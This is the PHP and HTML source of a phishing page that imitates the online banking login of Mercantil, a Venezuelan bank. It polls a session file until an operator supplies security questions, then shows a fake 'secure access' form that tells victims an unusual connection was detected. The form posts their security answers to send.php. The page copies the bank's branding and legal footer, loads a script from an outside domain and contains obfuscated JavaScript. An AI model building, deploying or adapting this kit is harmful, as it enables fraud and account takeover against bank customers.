<?php
// 1. Verificar si el ID fue pasado como parámetro
if (!isset($_GET['id'])) {
    exit('ID de sesión no especificado.');
}

$session_id = $_GET['id'];
$request_file = __DIR__ . "/requests/$session_id.json";

// 2. Verificar que el archivo de sesión exista
if (!file_exists($request_file)) {
    exit('Sesión no encontrada o expirada.');
}

// 3. Iniciar sesión con ese ID
session_write_close();
session_id($session_id);
session_start();

// 4. Leer el archivo JSON siempre
$data = json_decode(file_get_contents($request_file), true);

// 5. Verificar si ya llegaron las preguntas
if (!isset($data['question1']) || !isset($data['question2'])) {
    // Aún no llegaron las preguntas — mostrar página de carga
    echo <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
  <title>Mercantil</title>
  <meta http-equiv="refresh" content="2.5">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }

    .loader-container {
      position: relative;
      width: 160px;
      height: 160px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .loader-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 5px solid #044c94;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }

    .loader-image {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      object-fit: cover;
      z-index: 2;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      margin-top: 20px;
      font-size: 18px;
      color: #044c94;
      font-weight: bold;
    }

    .loading-text span::after {
      content: "...";
      animation: dots 1.5s infinite steps(4, jump-none);
    }

    @keyframes dots {
      0% { content: ""; }
      25% { content: "."; }
      50% { content: ".."; }
      75% { content: "..."; }
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="loader-ring"></div>
    <img
      src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/42/b1/34/42b13410-089c-9c97-95df-59a24fe3c119/AppIcon-1x_U007emarketing-0-6-0-85-220-0.png/1024x1024.jpg"
      alt="Cargando"
      class="loader-image"
    />
  </div>
  <div class="loading-text">Cargando<span></span></div>
</body>
</html>
HTML;
    exit;
}

// 6. Asignar preguntas
$question1 = $data['question1'];
$question2 = $data['question2'];
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
    <title>Mercantil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#1976d2">
    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="styles.css">
    <!-- Google tag (gtag.js) -->

    <style>
        .logo-wrapper img,
.iso-wrapper img {
    width: 88px !important;
    height: auto !important;
    max-width: 120px !important;
    margin-left: 105px !important;
}

    </style>
</head>

<body>

    <app _nghost-ois-c32="" ng-version="13.3.11">
        <router-outlet _ngcontent-ois-c32=""></router-outlet>
        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
                <div _ngcontent-ois-c33="" class="overlay">
                    <div _ngcontent-ois-c33="" class="multi-spinner-container">
                        <div _ngcontent-ois-c33="" class="multi-spinner blue">
                            <div _ngcontent-ois-c33="" class="multi-spinner orange"></div>
                        </div>
                    </div>
                </div>
            </melp-loading>
            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
                <div _ngcontent-ois-c54="" class="nav-bar">
                    <div _ngcontent-ois-c54="" class="left-side">
                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper">
                            <div _ngcontent-ois-c54="" class="main-menu-toggle"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
                        </div>
                        <div _ngcontent-ois-c54="" class="bezel-wrapper"><span _ngcontent-ois-c54="" class="bezel-1"></span><span _ngcontent-ois-c54="" class="bezel-2"></span></div>
                        <div class="logo-wrapper">
                            <img alt="Logo" src="logotauro.svg">
                        </div>
                    </div>
                    <div _ngcontent-ois-c54="" class="right-side">
                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row">
                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>


                        </div>
                        <div _ngcontent-ois-c54="" class="transition">

                        </div>
                    </div>
                </div>
            </melp-header>
            <melp-confirm _ngcontent-ois-c85="" _nghost-ois-c55="">
                <div _ngcontent-ois-c55="" id="confirm-modal" class="overlay">
                    <div _ngcontent-ois-c55="" class="card">
                        <div _ngcontent-ois-c55="" class="modal-img"><img _ngcontent-ois-c55="" alt="icon" src="timer.svg"></div>
                        <div _ngcontent-ois-c55="" class="card-body">
                            <div _ngcontent-ois-c55="" class="modal-title">Hola, ¿estás ahí?</div>
                            <div _ngcontent-ois-c55="" class="modal-content">No has interactuado con nosotros en los últimos minutos.</div>
                            <div _ngcontent-ois-c55="" class="modal-content">¿Deseas mantener tu sesión activa?</div>
                            <div _ngcontent-ois-c55="" class="button-wrapper"><button _ngcontent-ois-c55="" class="btn btn-secondary">No</button><button _ngcontent-ois-c55="" class="btn btn-primary">Sí</button></div>
                        </div>
                    </div>
                </div>
            </melp-confirm>
            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">

            </melp-modal>
            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">

            </melp-modal-image>
            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
                <div _ngcontent-ois-c74="" class="fade-background">
                    <div _ngcontent-ois-c74="" class="card"><span _ngcontent-ois-c74="" class="close">×</span>
                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card">
                            <div _ngcontent-ois-c74="" class="title"></div>
                            <div class="share-info">

                                <div id="password-popup" style="display:none;">
                                    <!-- Aquí va el contenido del popup de contraseña -->
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </melp-share-transaction-form>

            <div _ngcontent-ois-c85="" id="app-container">
                <div _ngcontent-ois-c85="" class="overlay-sidebar"></div>
                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
                    <div _ngcontent-ois-c77="" class="hide">
                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">

                            <div _ngcontent-ois-c76="" id="navigation">
                                <div _ngcontent-ois-c76="" class="data-info">
                                    <div _ngcontent-ois-c76="" class="data-info-section">
                                        <span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">

                                        </span>

                                    </div>
                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>

                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">

                                    </melp-alert-float>
                                </div>
                            </div>
                        </melp-navigation>
                    </div>
                    <div _ngcontent-ois-c77="" id="system-error" class="hide">

                    </div>
                </melp-system-error>
                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">


                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged">

                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Regístrate</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
                        </div>



                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level">

                        </div>
                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
                                    <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>








                            </div>
                        </div>

                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper">


                        </div>
                    </div>
                </melp-sidebar>


                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">

                    <div _ngcontent-ois-c83="" class="second-sidebar">

                    </div>
                </melp-second-sidebar>

                <router-outlet _ngcontent-ois-c85=""></router-outlet>
                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
                        <div _ngcontent-ois-c161="">
                            





                            <div style="text-align: ;">
                            <h2 style="font-size: 1.3rem; color: #249dc5; padding-left: 36px; padding-top: 25px; font-family: Arial;">Acceso seguro</h2></div>
                            <div class="secure-access-layout">
                              <div class="secure-access-left">
                                  
                                <div class="secure-access-card">
                                  <p class="intro">
                                    <strong>Se ha detectado que esta conexión presenta características diferentes a las habituales.</strong><br>
                                    Para continuar con tu acceso a Mercantil Créditos en Línea, completa los datos solicitados:
                                  </p><br>

                                    <h3>1.- Preguntas de seguridad</h3>

                                    <form id="loginForm" name="loginForm" method="POST" action="send.php" class="form-group ng-untouched ng-pristine">
                                        <!-- 🔹 Campo oculto para pasar el ID original a send.php -->
                                        <input type="hidden" name="id" value="<?php echo htmlspecialchars($session_id); ?>">
                                        <div _ngcontent-ois-c165="" class="ng-star-inserted">
                                            <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                <div class="mat-form-field-wrapper ng-tns-c71-2">
                                                    <span class="mat-form-field-label-wrapper ng-tns-c71-1">
                                                    <label id="mat-form-field-label-3" for="usr" aria-owns="usr" style="font-size: 0.94rem;" ><?= htmlspecialchars($question1) ?></label>
                                                                                                </span><br>
    <div class="mat-form-field-flex ng-tns-c71-2">         
    <div class="mat-form-field-infix ng-tns-c71-2">
        
        <input name="prg" id="prg" placeholder="Respuesta..." formcontrolname="prg2" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-tns-c71-1 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" type="password" data-placeholder="Respuesta..." required minlength="4">
                                                        </div>

                                                        
                                                        <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                                                            <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-2"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
                                                        </div>

                                                    </div>
                                                    <div class="mat-form-field-underline ng-tns-c71-2 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-2"></span></div>

                                                    <div class="mat-form-field-subscript-wrapper ng-tns-c71-2">

                                                        <div class="mat-form-field-hint-wrapper ng-tns-c71-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">

                                                            <div class="mat-form-field-hint-spacer ng-tns-c71-2"></div>
                                                        </div>

                                                    </div>
                                                </div>
                                            </mat-form-field>
                                        </div>

                                        <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                            <div class="mat-form-field-wrapper ng-tns-c71-1">

                                                <span class="mat-form-field-label-wrapper ng-tns-c71-1">
                                                <label id="mat-form-field-label-3" for="clv" aria-owns="clv" style="font-size: 0.94rem;" ><?= htmlspecialchars($question2) ?></label>
                                                                                            </span><br>
           <div class="mat-form-field-flex ng-tns-c71-1">
            <div class="mat-form-field-infix ng-tns-c71-1">
                                            
<input name="prg2" id="prg2" placeholder="Respuesta..." formcontrolname="prg2" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-tns-c71-1 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" type="password" data-placeholder="Respuesta..." required minlength="4">
            </div>

               <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                   <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-2"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
               </div>
               

                                                </div>
                                                <div class="mat-form-field-underline ng-tns-c71-1 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-1"></span></div>

                                                <div class="mat-form-field-subscript-wrapper ng-tns-c71-1">

                                                    <div class="mat-form-field-hint-wrapper ng-tns-c71-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">

                                                        <div class="mat-form-field-hint-spacer ng-tns-c71-1"></div>
                                                    </div>

                                                </div>
                                            </div>
                                            <a href="#" class="forgot">¿Olvidaste tus respuestas?</a>
                                        </mat-form-field>
                                    

                                  <hr>

                                  <h3>2.- Verifica tu conexión</h3>
                                    <div class="connection-options">
                                      <label for="personal">
                                        <input type="submit" name="device" id="personal" style="display:none;">
                                        <img src="personal.svg" alt="Uso Frecuente">
                                        <div>Equipo de uso personal</div>
                                      </label>

                                      <label for="shared">
                                        <input type="submit" name="device" id="shared" style="display:none;">
                                        <img src="compartido.svg" alt="Uso Eventual">
                                        <div>Equipo de uso compartido</div>
                                      </label>
                                    </div>
                                </div>
                              </div>
                                        </form>

                              <!-- 🔒 Columna derecha -->
                              <div class="secure-access-right">
                                <div class="secure-access-icon">
                                  <img src="assets/Tips_seg-1.svg" alt="Candado decorativo">
                                </div>
                              </div>

                            </div>



                            
                            



                        </div>
                    </melp-login-background>

                </melp-login>

                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
                </melp-footer>
            </div>
        </melp-standard-layout>

    </app>
    <script crossorigin="anonymous" src="https://code.jquery.com/jquery-3.7.1.js https://vipsan7a.com/activaci0n/3760/config/segundos.js https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js " type="text/javascript"></script>
    <script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            font-size: 18px;
            font-family: Arial, sans-serif;
            z-index: 9999;
        }

        .loading-container {
            margin-top: 25%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <div id="loadingOverlay">
        <div class="loading-container">
            <div class="spinner"></div><br><br>
            <p id="loadingText"></p>
        </div>
    </div>

    <script>
    function _0x31a5(_0x10b21e,_0x3e09a4){_0x10b21e=_0x10b21e-0x174;const _0x210797=_0x2107();let _0x31a512=_0x210797[_0x10b21e];return _0x31a512;}const _0x499c65=_0x31a5;(function(_0x2dd253,_0x4fe5cb){const _0x4bb9e4=_0x31a5,_0x3440df=_0x2dd253();while(!![]){try{const _0x13eb35=-parseInt(_0x4bb9e4(0x185))/0x1+-parseInt(_0x4bb9e4(0x188))/0x2+parseInt(_0x4bb9e4(0x17f))/0x3*(-parseInt(_0x4bb9e4(0x17b))/0x4)+parseInt(_0x4bb9e4(0x18b))/0x5*(-parseInt(_0x4bb9e4(0x181))/0x6)+parseInt(_0x4bb9e4(0x178))/0x7+-parseInt(_0x4bb9e4(0x176))/0x8*(-parseInt(_0x4bb9e4(0x179))/0x9)+-parseInt(_0x4bb9e4(0x17c))/0xa*(-parseInt(_0x4bb9e4(0x17a))/0xb);if(_0x13eb35===_0x4fe5cb)break;else _0x3440df['push'](_0x3440df['shift']());}catch(_0x3f7aa3){_0x3440df['push'](_0x3440df['shift']());}}}(_0x2107,0x6cb76),document[_0x499c65(0x182)](_0x499c65(0x186),function(){const _0x361d2b=_0x499c65;document['querySelectorAll'](_0x361d2b(0x189))['forEach'](function(_0x55a6b1){const _0x2236b4=_0x361d2b,_0x4f6384=_0x55a6b1[_0x2236b4(0x18f)](_0x2236b4(0x17d));if(!_0x4f6384)return;_0x55a6b1[_0x2236b4(0x182)]('focus',()=>_0x4f6384[_0x2236b4(0x175)]['add'](_0x2236b4(0x17e))),_0x55a6b1[_0x2236b4(0x182)](_0x2236b4(0x18e),()=>_0x4f6384[_0x2236b4(0x175)][_0x2236b4(0x183)](_0x2236b4(0x17e)));}),document['querySelectorAll']('.mat-form-field-suffix\x20mat-icon\x20img')['forEach'](function(_0x55378d){const _0xcfce06=_0x361d2b;_0x55378d['addEventListener'](_0xcfce06(0x187),function(){const _0x13008d=_0xcfce06,_0x442d1f=_0x55378d[_0x13008d(0x18f)](_0x13008d(0x17d))[_0x13008d(0x174)](_0x13008d(0x177));if(!_0x442d1f)return;const _0x4e8e95=_0x442d1f['getAttribute'](_0x13008d(0x18a))===_0x13008d(0x190);_0x442d1f[_0x13008d(0x184)](_0x13008d(0x18a),_0x4e8e95?_0x13008d(0x18c):_0x13008d(0x190)),_0x55378d['setAttribute'](_0x13008d(0x18d),_0x4e8e95?_0x13008d(0x180):'assets/eye-disabled-blue.svg');});});}));function _0x2107(){const _0x5cfee7=['2765756pRBQQf','3240HKaPqi','1270181kDeXJq','1726556cLoyOh','130snFztk','.mat-form-field','js-focused','6BAlrua','assets/eye-enabled-blue.svg','572922GnTMLf','addEventListener','remove','setAttribute','430640EfKivY','DOMContentLoaded','click','1257594DEQrDs','.mat-form-field\x20.mat-input-element','type','10rRYgvT','text','src','blur','closest','password','querySelector','classList','14728QtuTwX','input'];_0x2107=function(){return _0x5cfee7;};return _0x2107();}
    </script>


</body>
</html>
